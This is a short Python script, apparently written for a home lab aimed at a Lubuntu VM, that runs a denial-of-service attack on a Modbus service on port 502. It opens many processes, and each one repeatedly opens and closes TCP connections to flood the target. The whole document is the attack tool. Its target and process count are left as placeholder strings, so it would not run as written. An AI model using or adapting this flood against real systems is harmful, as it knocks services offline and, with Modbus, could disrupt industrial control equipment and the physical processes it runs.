import socket
import multiprocessing
import time

# --- CONFIGURATION ---

VICTIM_IP = "your Lubuntu VM's IP address"
VICTIM_PORT = 502
PROCESS_COUNT =  "Number of simultaneous attack processes to launch" 

def flood():
    """This function creates a socket and tries to connect repeatedly."""
    while True:
        try:
            # Create a new socket for each attempt
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set a short timeout so it doesn't wait forever
            s.settimeout(1)
            # Try to connect
            s.connect((VICTIM_IP, VICTIM_PORT))
            # Optional: print a dot for each successful connection
            print(".", end="", flush=True)
            # Close the connection immediately to free up resources for the next one
            s.close()
        except socket.error:
            # Print an 'x' if the connection fails (target is overwhelmed)
            print("x", end="", flush=True)
            pass

if __name__ == '__main__':
    print("--- Starting Modbus Denial of Service Attack ---")
    print(f"[*] Target: {VICTIM_IP}:{VICTIM_PORT}")
    print(f"[*] Launching {PROCESS_COUNT} flood processes...")
    print("[!] Press Ctrl+C to stop the attack.")
    time.sleep(2)

    processes = []
    for i in range(PROCESS_COUNT):
        # Create a new process that will run our flood function
        process = multiprocessing.Process(target=flood)
        process.start()
        processes.append(process)
    
    # Keep the main script alive until you press Ctrl+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
        # Terminate all the attack processes
        for process in processes:
            process.terminate()
        print("[*] All flood processes terminated.")